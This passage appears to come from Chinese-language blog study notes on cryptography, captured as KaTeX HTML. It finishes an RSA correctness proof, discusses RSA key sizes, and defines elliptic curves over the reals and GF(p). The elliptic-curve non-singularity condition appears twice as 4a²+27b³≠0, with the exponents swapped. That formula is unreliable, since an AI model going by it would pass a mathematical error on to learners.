mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>是否能推出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mi>e</mi></msup><mo>≡</mo><mi>c</mi><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">m^{e} \equiv c \bmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p>因为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>e</mi><mo>≡</mo><mn>1</mn><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">de \equiv 1 \bmod φ(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>e</mi><mo>≡</mo><mi>k</mi><mo separator="true">⋅</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">de \equiv k·φ(n)+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p>故有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>c</mi><mrow><mi>e</mi><mi>d</mi></mrow></msup><mo>=</mo><msup><mi>c</mi><mrow><mi>k</mi><mo separator="true">⋅</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></msup><mo>=</mo><msup><mi>c</mi><mrow><mi>k</mi><mo separator="true">⋅</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup><mo separator="true">⋅</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">c^{ed}=c^{k·φ(n)+1}=c^{k·φ(n)}·c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.849108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8879999999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mpunct mtight">⋅</span><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8879999999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mpunct mtight">⋅</span><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">c</span></span></span></span></p><blockquote><p>欧拉定理：若n,a为正整数，且n,a互质，则:a^φ(n)≡1 (mod n)其中φ(n)是欧拉函数</p></blockquote><p>由欧拉定理，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>c</mi><mrow><mi>k</mi><mo separator="true">⋅</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mn>1</mn><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c^{k·φ(n)} \equiv 1 \bmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8879999999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mpunct mtight">⋅</span><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>，故有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>c</mi><mrow><mi>k</mi><mo separator="true">⋅</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></msup><mo>≡</mo><mi>c</mi><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c^{k·φ(n)+1} \equiv c \bmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8879999999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mpunct mtight">⋅</span><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p>也就是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>c</mi><mrow><mi>e</mi><mi>d</mi></mrow></msup><mo>≡</mo><mi>c</mi><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c^{ed} \equiv c \bmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.849108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p>即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mi>e</mi></msup><mo>≡</mo><mi>c</mi><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">m^{e} \equiv c \bmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p>得证</p><h3 id="特点"><a class="markdownIt-Anchor" href="#特点"></a> 特点</h3><p>密码分析者攻击RSA体制的关键点在于如何分解<em>n</em>。若分解成功使<em>n</em>=<em>pq</em>，则可以算出𝜑(<em>n</em>)＝(<em>p</em>-1)(<em>q</em>-1)，然后由公开的<em>e</em>，解出秘密的<em>d</em> 。</p><p>若使RSA安全，<em>p</em>与<em>q</em>必为足够大的素数，使分析者没有办法在有效时间内将<em>n</em>分解出来。建议选择<em>p</em>和<em>q</em>至少是1024比特的素数，模<em>n</em>的长度至少是2048比特。</p><h3 id="例题-2"><a class="markdownIt-Anchor" href="#例题-2"></a> 例题</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240605205243297.png" alt="image-20240605205243297" /></p><h2 id="椭圆曲线密码体制ecc"><a class="markdownIt-Anchor" href="#椭圆曲线密码体制ecc"></a> 椭圆曲线密码体制ECC</h2><p>这是目前已知公钥密码体制中每位提供加密强度最高的一种体制</p><h3 id="定义"><a class="markdownIt-Anchor" href="#定义"></a> 定义</h3><p>椭圆曲线是一个具有两个变元<em>x</em>和<em>y</em>的三次方程，它是满足：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><mo>+</mo><mi>a</mi><mi>x</mi><mi>y</mi><mo>+</mo><mi>b</mi><mi>y</mi><mo>=</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>c</mi><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>d</mi><mi>x</mi><mo>+</mo><mi>e</mi></mrow><annotation encoding="application/x-tex">y^2+axy+by=x^3+cx^2+dx+e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">c</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span></span></span></span></p><p>的所有点的集合，外加一个无穷远点O</p><p><strong>实数域</strong>上的椭圆曲线是对于固定的<em>a</em>、<em>b</em>值，满足形如方程：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><mo>=</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">y^2=x^3+ax+b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span></p><p>的所有点(<em>x</em>, <em>y</em>)的集合，外加一个无穷远点<em>O</em>。其中<em>a**、**b</em>是实数，满足4a<sup>2</sup>+27b<sup>3</sup>≠0。<em>x</em>和<em>y</em>在实数域上取值。</p><h4 id="有限域gfp上的椭圆曲线"><a class="markdownIt-Anchor" href="#有限域gfp上的椭圆曲线"></a> 有限域GF(<em>p</em>)上的椭圆曲线</h4><p><strong>有限域GF(p)上</strong>的椭圆曲线是对于固定的<em>a</em>、<em>b</em>值，满足形如方程：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><mo>≡</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y^2\equiv x^3+ax+b (\bmod p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></p><p>的所有点(<em>x</em>, <em>y</em>)的集合，外加一个无穷远点<em>O</em></p><p>其中a、b、x和y均在有限域GF(<em>p</em>)即{0,1,…,<em>p</em>-1}上取值，且满足4a<sup>2</sup>+27b<sup>3</sup>≠0，p是大素数。</p><p>接下来我们讨论有限域GF(<em>p</em>)上的椭圆曲线。</p><ul><li><p>该曲线由<em>p</em>、<em>a</em>和<em>b</em>完全决定，故一般可记为E<sub>p</sub>(a,b)</p></li><li><p>该椭圆曲线只有有限个点数<em>N</em>（称为椭圆曲线的阶，包括无穷远点）。它与安全性相关，<em>N</em>越大安全性越高</p></li><li><p>粗略估计时，<em>N</em>近似等于<em>p</em>；更精确的范围由Hasse定理确定</p></li></ul><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240605210619155.png" alt="image-20240605210619155" style="zoom:67%;" /><h5 id="计算"><a class="markdownIt-Anchor" href="#计算"></a> 计算</h5><p>GF(23)上的一个椭圆曲线：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><mo>≡</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>23</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y^2\equiv x^3+x(\bmod 23)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">3</span><span class="mclose">)</span></span></span></span>​，该椭圆曲线方程在GF(23)上的解为：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240605210458949.png" alt="image-20240605210458949" style="zoom:50%;" /><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240605210520001.png" alt="image-20240605210520001" style="zoom: 67%;" /><p>对E<sub>p</sub>(a,b)的计算过程如下：</p><ol><li>对每一𝑥（0 ≤ 𝑥 &lt; 𝑝且𝑥为整数），计算<em>x</em>3+<em>ax</em>+<em>b</em> (mod <em>p</em>)</li><li>决定（1） 中求得的值在模p下是否有平方根，如果没有，则曲线上没有与这一𝑥相对应的点。如果有，则求出两个平方根（<em>y</em>=0时只有一个平方根）</li></ol><p>决定是否有平方根涉及到<strong>平方剩余</strong>定理。</p><blockquote><p>平方剩余</p><p>定理：设p是素数，a是一正整数，a是p的平方剩余的充要条件是：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>2</mn></mrow></msup><mo>≡</mo><mn>1</mn><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> 